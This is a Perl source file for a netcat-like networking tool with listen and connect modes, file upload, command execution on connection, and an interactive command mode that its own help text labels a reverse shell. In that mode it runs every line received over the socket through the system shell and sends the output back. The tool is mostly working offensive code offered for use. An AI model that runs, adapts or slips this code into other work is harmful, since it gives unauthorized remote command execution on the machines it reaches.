#!/usr/bin/perl

#
#   Author: <wexe1@protonmail.com>
#   License: GNU GPL-3.0
#

use strict;
use warnings;
use IO::Socket::INET;
use Getopt::Long;
use IO::Select;

my $ioset = IO::Select->new();
my($target, $port, $listen, $command, $execute, $upload, $help);
my $guard = 0;  # prevent overwriting file
my $options = 0; # true if options are set

sub usage {
    print "usage:\n";
    print "connect to somewhere:\t $0 -t <hostname> -p <port> [options]\n";
    print "listen for inbound:\t $0 -l -p <port> [options]\n";
    print "options:\n";
    print "\t-h  --help\t\t\tprints this help\n";
    print "\t-t  --target\t\t\tin client mode target hostname, in server mode hostname to bind\n";
    print "\t-p  --port\t\t\tin client mode target port, in server mode port to binf\n";
    print "\t-l  --listen\t\t\tlisten on [host]:[port] for connecions\n";
    print "\t-c  --command\t\t\texecute shell commands\n";
    print "\t-e  --execute=<command>\texecuting command when receiving connection\n";
    print "\t-u  --upload=<destination>\treceiving file and saving it in <destination>\n";
    print "e.g.\n";
    print "Reverse shell:\n";
    print "\tperl $0 -t localhost -p 8888 -l\n"; # reverse remote command execution (server)
    print "\tperl $0 -t localhost -p 8888 -c\n"; # reverse remote command execution (client)
    print "Execute command:\n";
    print "\tperl $0 -l -p 6666 -e .\\test.exe\n";
    print "\techo NULL | perl $0 -t localhost -p 6666\n";
    print "Uploading file:\n";
    print "\tperl $0 -l -p 6666 -u test2.txt\n";
    print "\tcat test.pl | perl $0 -t localhost -p 6666\n";
    print "\n";
    exit;
}

sub runcmd {
    chomp(my $cmd = shift);
    my $output = `$cmd`;
    return $output;
}

sub uploadfile {
    my $sock = shift;
    my $file_buffer = '';
    print "[+] Receiving data...\n";
    while() {
        die "[!!] recv error: $!\n" unless(defined($sock->recv(my $data, 1024)));
        unless($data) {
            last;
        }
        else {
            $file_buffer .= $data;
        }
    }
    print "[+] Data received\n";
    unless($guard) {
        print "[+] Saving data to file $upload...\n";
        open(my $fh, ">$upload") or die "[!!] Cannot open file: $!\n";
        print $fh $file_buffer;
        $guard = 1;
        close $fh;
        return;
    }
    exit;
}

sub execute {
    my $sock = shift;
    my $cmd = shift;
    print "[+] Running command $cmd...\n";
    my $output = &runcmd($cmd);
    $sock->send($output);
}

sub optionmanager {
    my $sock = shift;
    if($upload) {
        &uploadfile($sock);
    }
    if($execute) {
        &execute($sock, $execute);
    }
    if($command) {
        $sock->send("[wx1]~# ");
        while() {
            my $cmd_buffer = '';
            while($cmd_buffer !~ /\n/) {
                die "[!!] recv error: $!\n" unless(defined($sock->recv(my $data, 1024)));
                $cmd_buffer .= $data;
            }
            my $response = &runcmd($cmd_buffer);
            $sock->send($response . "[wx1]~# ");
        }
    }
}

sub correspond {
    my $sock = shift;
    
    my $pid;
    local $| = 1;
    if (!defined($pid = fork)) {
        die "fork: $!\n";
    }

    while() {
        if ($pid) {
            my $recv_len = 1;
            my $response = '';
            while($recv_len) {
                if(defined($sock->recv(my $data, 4096))) {
                    $recv_len = length($data);
                    die "[!] no data\n" if $recv_len < 1;
                    $response .= $data;
                    last if $recv_len < 4096;
                }
                else { die "[!!] recv error: $!\n"; }
            }
            print $response;
        }
        else {
            my $buffer = <STDIN>;
            $sock->send($buffer);
        }
    }
}

sub clienthandler {
    my $sock = shift;
    if($options) {
        &optionmanager($sock);
        return;
    }
    else {
        &correspond($sock);
        return;
    }
}

sub serverloop {
    unless($target) {
        $target = "0.0.0.0";
    }
    my $server = IO::Socket::INET->new(
        Proto => 'tcp',
        LocalAddr => $target,
        LocalPort => $port,
        Listen => 5
    ) or die "[!!] Cannot create socket: $!\n";
    $ioset->add($server);
    while() {
        for my $s ($ioset->can_read) {
            if ($s == $server) {
                my $client = $s->accept;
                $client->autoflush(1);
                $ioset->add($client);
                print "[+] new connection\n";
                $guard = 0;
                &clienthandler($client);
            }
            else {
                &clienthandler($s);
                close $s;
                $ioset->remove($s);
                print "[-] closed connection\n";
            }
        }
    }
}

sub clientloop {
    my $buffer = shift;
    my $client = IO::Socket::INET->new(
        Proto => 'tcp',
        PeerAddr => $target,
        PeerPort => $port
    ) or die "[!!] Cannot connect to peer: $!\n";
    $client->autoflush(1);
    if($buffer && $buffer !~ m/^NULL$/i) {
        print "[+] Sending data...\n";
        $client->send($buffer) or die "[!!] Cannot send to peer: $!\n";
        print "[+] Data sent\n";
    }
    else {
        &clienthandler($client);
    }
}

&usage() unless @ARGV;
GetOptions(
    "t|target=s" => \$target,
    "p|port=i" => \$port,
    "l|listen" => \$listen,
    "c|command" => \$command,
    "e|execute=s" => \$execute,
    "u|upload=s" => \$upload,
    "h|help" => \$help
);

&usage() if $help;

unless($port) {
    print "[!!] no port\n";
    &usage();
}
$options = ($command || $execute || $upload) ? 1 : 0;
if($listen) {
    &serverloop();
}
else {
    &usage() unless ($target && $port);
    my $buffer = '';
    unless($options) {
        while(<STDIN>) { $buffer .= $_; }
    }
    &clientloop($buffer);
}
